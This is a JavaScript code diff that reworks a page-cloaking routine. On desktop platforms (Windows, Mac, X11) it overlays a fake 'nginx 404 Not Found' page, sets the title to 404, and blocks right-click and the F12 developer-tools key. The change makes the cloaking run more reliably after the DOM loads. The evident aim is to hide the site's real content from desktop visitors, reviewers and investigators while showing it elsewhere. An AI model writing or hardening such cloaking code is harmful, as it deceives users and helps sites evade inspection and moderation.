@@ -119,20 +119,54 @@ var sousuo="日期";
 
 		}
 		}		
-    if(system.win||system.mac||system.xll){
-		let temp = '<div style="position: fixed; top: 0px;padding-top:20px; z-index: 99999; width: 100%; height: '+win_Height+'px; background-color: #ffffff; font-size: 16px;"><center><h2>404 Not Found</h2></center><hr><center>nginx pc</center></div>';
-		document.write(temp);
-		document.getElementsByTagName("title")[0].innerHTML = "\u0034\u0030\u0034";
-		document.oncontextmenu = false;
-		document.onkeydown = function(e) {
-			var currKey = 0, evt = e || window.event;
-			currKey = evt.keyCode || evt.which || evt.charCode;
-			if (currKey == 123) {
-				window.event.cancelBubble = true;
-				window.event.returnValue = false;
-			}
-		}
+if(system.win||system.mac||system.xll){
+    // 等待DOM完全加载
+    function init404Page() {
+        let temp = '<div style="position: fixed; top: 0px;padding-top:20px; z-index: 99999; width: 100%; height: '+win_Height+'px; background-color: #ffffff; font-size: 16px;"><center><h2>404 Not Found</h2></center><hr><center>nginx pc</center></div>';
+        
+        // 插入内容
+        document.body.insertAdjacentHTML('afterbegin', temp);
+        
+        // 确保有head元素
+        if (!document.head) {
+            document.documentElement.insertBefore(
+                document.createElement('head'),
+                document.body
+            );
+        }
+        
+        // 确保有title元素
+        let titleElements = document.getElementsByTagName('title');
+        if (titleElements.length === 0) {
+            let title = document.createElement('title');
+            title.textContent = "404";
+            document.head.appendChild(title);
+        } else {
+            titleElements[0].textContent = "404";
+        }
+        
+        // 或者直接使用
+        // document.title = "404";
+        
+        // 事件处理
+        document.oncontextmenu = function() { return false; };
+        document.onkeydown = function(e) {
+            e = e || window.event;
+            if (e.keyCode === 123) {
+                e.preventDefault();
+                return false;
+            }
+        };
     }
+    
+    // 确保DOM已加载
+    if (document.readyState === 'loading') {
+        document.addEventListener('DOMContentLoaded', init404Page);
+    } else {
+        init404Page();
+    }
+}
+
 
 
 
